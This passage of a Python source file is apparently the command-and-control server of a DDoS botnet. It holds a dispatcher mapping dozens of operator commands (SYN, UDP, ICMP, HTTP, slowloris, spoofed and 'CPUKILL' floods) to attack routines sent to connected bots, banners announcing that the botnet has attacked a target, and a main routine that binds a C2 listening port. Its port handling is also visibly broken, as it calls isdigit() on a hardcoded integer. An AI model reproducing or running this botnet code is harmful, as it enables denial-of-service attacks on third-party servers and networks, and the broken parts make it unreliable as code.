            elif command == '.TCP_PYBOT': # TCP Junk (Random TCP Data)
                tcp_pybot(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.MULTIDT': # TCP Junk (MULTI)
                tcp_multi(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TCPSYN': # TCP Junk And Syn flooding
                tcpsyn(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.NULCEAR_ATTACKS': # make LAG in bot
                NULCEAR_ATTACKS(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.TCP_BYPASS': # TCP Junk (Random TCP Data)
                tcp_bypass(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.SYN': # SYN flood
                syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SYN2': # SYN flood
                syn2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SYN3': # SYN flood
                syn3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SYN4': # SYN flood
                syn4(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SYN5': # SYN flood
                syn5(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.STD': # Standard Internet Flood
                std(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ASTD': # Standard Internet Flood
                astd(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.STD_HEX': # Standard Internet Flood
                std_hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.MIX_SENT': # random bytes sent with udp
                mix_sent(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.RAND_STD': # Standard Internet Flood
                rand_std(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SLOW': # sloworis flooding
                slow_attack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ICMP': # Internet Control Message Protocol Flood
                icmp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ICMP2': # Internet Control Message Protocol Flood 2
                icmp2(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.ICMP3': # Internet Control Message Protocol Flood 3
                icmp3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ICMP4': # Internet Control Message Protocol Flood 4
                icmp4(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.HEX': # Specific HEXIDECIMAL Flood
                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.RHEX': # Specific HEXIDECIMAL Flood
                rhex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CPUKILL': # CPUKILL Attack (Ramps up CPU)
                cpukill(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HEXCPU': # CPUKILL Attack | HEX
                hexcpu(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.JUNK': # JUNK Flood
                junk(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.VSE': # VSE Flood
                vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.RAND_VSE': # VSE Flood
                rand_vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.XTDCUSTOM':
                xtdcustom(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HTTP_5050': # HTTP Flood PORT 5050
                http(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HTTP_GET': # HTTP Flood PORT ALL
                http_2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER': # HTTP Flood PORT ALL 2
                pyflooder(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.NULL': # HTTP Flood PORT ALL 2
                null_flooding(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.UDP_QBOT': # Connection flood but no data in packet
                rand_udp_bypass_qbot(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.SPOOF': # HTTP Flood PORT ALL 2
                spoof_flooding(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER2': # HTTP Flood PORT ALL 2
                pyflooder2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER_HELL': # HTTP Flood PORT ALL 2
                pyflooder_hell(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER_HELL2': # HTTP Flood PORT ALL 2
                pyflooder_hell2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PHS': # HTTP Flood PORT ALL 2
                PYFLOODERHELLSOCKET(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER3': # HTTP Flood PORT ALL 2
                pyflooder3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.PYFLOODER_6K': # HTTP Flood PORT ALL 2
                pyflooder_l4_l7(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.RATE_ATTACK': # RATE FLOODING
                rate_attack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.REDUCE_WAVE': # RATE FLOODING
                REDUCE_WAVE(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.RATE_ATTACK2': # RATE FLOODING
                rate_attack2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HTTP_REQ': # HTTP Flood REQ
                http_req(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            else:
                send(client, Fore.RED + f'\x1b[3;31;40m{data} Invalid commands 📄!')
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
        ╔════════════════════════════════════╗
        ║                                    ║
        ║        БОТНЕТ ЗАПУЩЕН              ║
        ║     ───────────────────────────    ║
        ║            ╔══════════╗            ║
        ╚════════════╣   LOGS   ╠════════════╝
                     ╚══════════╝
"""

def attack_sent1(ip, port, secs, client):
    global send_attack_target
    loadering(client)
    color_random = color()
    send(client, f"")
    for x in banner.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    message_flooding = f"""
╔═════════════════════════════ > _
! BOTNET HAS ATTACKED YOUR TARGET !
   ═════════════════════════
       IP {ip}
     PORT {port}
     TIME {secs}
   ═════════════════════════
    </> </> </> </> </> </>
╚═════════════════════════════[ {len(bots)} botnet ] >_"""
    color_random = color()
    for x in message_flooding.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f"\033[32mSuccessfully sent command 📃")
    send_attack_target += 1

def attack_sent2(ip, port, secs, size, client):
    global send_attack_target
    loadering(client)
    color_random = color()
    send(client, f"")
    for x in banner.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    message_flooding = f"""
╔══════════════════════════[ATTACKING SENDING] >_
    >_ SEND TO BOTNET >_
  ════════════════════════
    IP > {ip}
  PORT > {port}
  TIME > {secs}
  SIZE > {size}
  ════════════════════════
   </> </> </> </> </> </>
╚══════════════════════════[{len(bots)} botnet] >_"""

    for x in message_flooding.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f"\033[32mSuccessfully sent command 📜")
    send_attack_target += 1

def main():
    if len(sys.argv) != 2:
        print(f'Usage: screen python3 {sys.argv[0]} <C2 Port>')
        exit()
    port = 7666
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('\x1b[3;31;40m Invalid C2 port')
        exit()
    port = int(port)
    init(convert=True)
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('\x1b[3;31;40m Failed to bind port')
        exit()
    sock.listen()
    threading.Thread(target=ping).start() # Start keepalive thread
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    try:
        main()
    except Exception:
        print('Error, skipping..')
